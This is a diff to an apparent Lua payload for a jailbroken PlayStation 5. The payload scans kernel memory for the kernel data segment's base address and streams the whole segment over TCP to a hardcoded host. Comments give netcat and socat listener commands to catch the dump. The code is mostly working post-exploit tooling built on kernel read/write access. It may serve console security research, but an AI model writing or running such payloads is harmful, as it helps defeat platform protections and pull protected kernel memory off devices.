@@ -1,7 +1,10 @@
 
 --[[
-    run netcat on the other end to receive the kernel .data dump
-    $ nc -nlvp 5656 > kernel_data_dump.bin
+    run netcat/socat on the other end to receive the kernel data dump
+    1) either through netcat
+        $ nc -nlvp 5656 > kernel_data_dump.bin
+    2) or through socat
+        $ socat -u TCP-LISTEN:5656,reuseaddr OPEN:kernel_data_dump.bin,create,trunc
 ]]
 
 IP = "192.168.1.2"
@@ -16,7 +19,30 @@ function aton(ip)
     return bit32.bor(bit32.lshift(d, 24), bit32.lshift(c, 16), bit32.lshift(b, 8), a)
 end
 
-function dump_kdata_over_network(IP, PORT)
+function find_kdata_base_offset(addr_inside_kdata)
+
+    print("start searching for kdata base...")
+
+    local addr = bit64.band(addr_inside_kdata, bit64.bnot(PAGE_SIZE-1))
+
+    local offset = 0
+    while true do
+
+        local n1 = kernel.read_dword(addr-offset):tonumber()
+        local n2 = kernel.read_dword(addr-offset+4):tonumber()
+        local n3 = kernel.read_dword(addr-offset+8):tonumber()
+        local n4 = kernel.read_dword(addr-offset+12):tonumber()
+
+        if n1 == 1 and n2 == 1 and n3 == 0 and n4 == 0 then 
+            return addr - offset
+        end
+
+        offset = offset + PAGE_SIZE
+    end
+
+end
+
+function dump_kdata_over_network(kdata_base)
 
     local sock_fd = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
     if sock_fd == -1 then
@@ -37,40 +63,52 @@ function dump_kdata_over_network(IP, PORT)
 
     print("connected sucessfully")
 
-    local start_index = 0
-    local end_index = kernel_offset.DATA_SIZE
-    
     local read_size = PAGE_SIZE
     local mem = memory.alloc(read_size)
     
     local MB = 0x100000
 
-    for index = start_index, end_index-1, read_size do
+    local offset = 0
+    while true do
 
-        local total_read = index - start_index
-
-        if total_read % (5 * MB) == 0 then
-            printf("dumping kernel .data: %d / %.2f mb", total_read / MB, end_index / MB)
-        end
-
-        kernel.copyout(kernel.addr.data_base + index, mem, read_size)
+        kernel.copyout(kdata_base + offset, mem, read_size)
 
         if syscall.write(sock_fd, mem, read_size):tonumber() == -1 then
             error("write() error: " .. get_error_string())
             break
         end
-    end
 
-    printf("dumped %.2f mb of kernel data", end_index / MB)
+        if offset % (5 * MB) == 0 then
+            printf("dumping kernel data: %d mb", offset / MB)
+        end
+
+        offset = offset + read_size
+    end
 
 end
 
 
 function main()
 
-    check_jailbroken()
+    check_kernel_rw()
 
-    dump_kdata_over_network(IP, PORT)
+    if PLATFORM ~= "ps5" then
+        error("this payload only targets ps5")
+    end
+
+    local kdata_base = kernel.addr.data_base
+    
+    -- if kdata base is unknown, search for it
+    if not kdata_base then
+        if not kernel.addr.inside_kdata then
+            error("an address inside kdata is needed for dumper to work")
+        end
+        kdata_base = find_kdata_base_offset(kernel.addr.inside_kdata)
+    end
+
+    print("kdata base: %s", hex(kdata_base))
+
+    dump_kdata_over_network(kdata_base)
 end
 
 main()
